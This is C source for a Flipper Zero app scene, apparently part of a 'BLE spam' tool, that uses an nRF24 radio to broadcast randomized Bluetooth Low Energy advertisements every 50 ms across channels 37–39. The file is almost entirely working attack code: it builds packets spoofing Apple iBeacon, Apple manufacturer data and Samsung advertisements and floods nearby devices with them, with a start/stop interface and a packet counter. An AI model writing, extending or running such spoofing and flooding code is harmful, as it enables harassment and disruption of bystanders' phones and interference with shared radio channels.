#include "../zx_ble_spam.h"
#include "../nrf24.h"
#include "scenes.h"
#include <furi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static FuriTimer* timer = NULL;
static uint16_t pkt_count = 0;

static const uint8_t ble_chs[] = {37, 38, 39};

static void build_packet(uint8_t* buf, uint8_t* len, uint8_t type) {
    uint8_t i = 0;
    buf[i++] = 0x02; buf[i++] = 0x01; buf[i++] = 0x06;
    if(type == 0) {
        buf[i++] = 0x1A; buf[i++] = 0xFF;
        buf[i++] = 0x4C; buf[i++] = 0x00;
        buf[i++] = 0x02; buf[i++] = 0x15;
        for(int j = 0; j < 16; j++) buf[i++] = rand() & 0xFF;
        buf[i++] = (rand() >> 8) & 0xFF;
        buf[i++] = rand() & 0xFF;
        buf[i++] = (rand() >> 8) & 0xFF;
        buf[i++] = rand() & 0xFF;
        buf[i++] = -59;
    } else if(type == 1) {
        buf[i++] = 0x05; buf[i++] = 0xFF;
        buf[i++] = 0x4C; buf[i++] = 0x00;
        buf[i++] = 0x07; buf[i++] = 0x00;
        for(int j = 0; j < 6; j++) buf[i++] = rand() & 0xFF;
    } else {
        buf[i++] = 0x03; buf[i++] = 0xFF;
        buf[i++] = 0x75;
        for(int j = 0; j < 8; j++) buf[i++] = rand() & 0xFF;
    }
    *len = i;
}

static void timer_callback(void* context) {
    App* app = context;
    uint8_t ch = ble_chs[pkt_count % 3];
    pkt_count++;

    nrf24_set_channel(ch);
    nrf24_set_mode(NRF24ModeTx);
    nrf24_set_ble_adv_mode(true);

    uint8_t pkt[32]; uint8_t len;
    build_packet(pkt, &len, pkt_count % 3);
    nrf24_send_packet(pkt, len, 20);
    nrf24_set_mode(NRF24ModeRx);

    if(pkt_count % 30 == 0) {
        app_add_log(app, "Spam: %d packets", pkt_count);
        view_dispatcher_send_custom_event(app->view_dispatcher, BLEEventUpdateDisplay);
    }
}

static void button_callback(GuiButtonType type, InputType input_type, void* context) {
    (void)type; (void)input_type;
    App* app = context;
    if(timer) {
        furi_timer_free(timer); timer = NULL;
        nrf24_set_ble_adv_mode(false);
    } else {
        pkt_count = 0;
        nrf24_set_ble_adv_mode(true);
        app->log_text[0] = '\0'; app->log_len = 0;
        app_add_log(app, "Spam started");
        timer = furi_timer_alloc(timer_callback, FuriTimerTypePeriodic, app);
        furi_timer_start(timer, 50);
    }
    view_dispatcher_send_custom_event(app->view_dispatcher, BLEEventToggleScan);
}

void zx_ble_spam_scene_peripheral_spam_on_enter(void* context) {
    App* app = context;
    widget_reset(app->widget);
    if(!app->nrf24_connected) {
        widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignCenter, FontSecondary, "nRF24 not connected");
        view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
        return;
    }
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, "Peripheral Spam");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignCenter, FontSecondary, "Spoofs iBeacon");
    widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignCenter, FontSecondary, "Apple and Samsung");
    widget_add_button_element(app->widget, GuiButtonTypeCenter, "Start", button_callback, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
}

bool zx_ble_spam_scene_peripheral_spam_on_event(void* context, SceneManagerEvent event) {
    App* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == BLEEventUpdateDisplay) {
        text_box_set_text(app->text_box, app->log_text);
        view_dispatcher_switch_to_view(app->view_dispatcher, AppViewTextBox);
        return true;
    }
    if(event.type == SceneManagerEventTypeCustom && event.event == BLEEventToggleScan) {
        if(timer) {
            widget_reset(app->widget);
            widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, "Peripheral Spam");
            widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignCenter, FontSecondary, "Spamming");
            widget_add_button_element(app->widget, GuiButtonTypeCenter, "Stop", button_callback, app);
        } else {
            widget_reset(app->widget);
            widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, "Peripheral Spam");
            widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignCenter, FontSecondary, "Stopped");
            widget_add_button_element(app->widget, GuiButtonTypeCenter, "Start", button_callback, app);
        }
        view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
        return true;
    }
    return false;
}

void zx_ble_spam_scene_peripheral_spam_on_exit(void* context) {
    if(timer) { furi_timer_free(timer); timer = NULL; }
    App* app = context;
    nrf24_set_ble_adv_mode(false);
    text_box_set_text(app->text_box, "");
    widget_reset(app->widget);
}
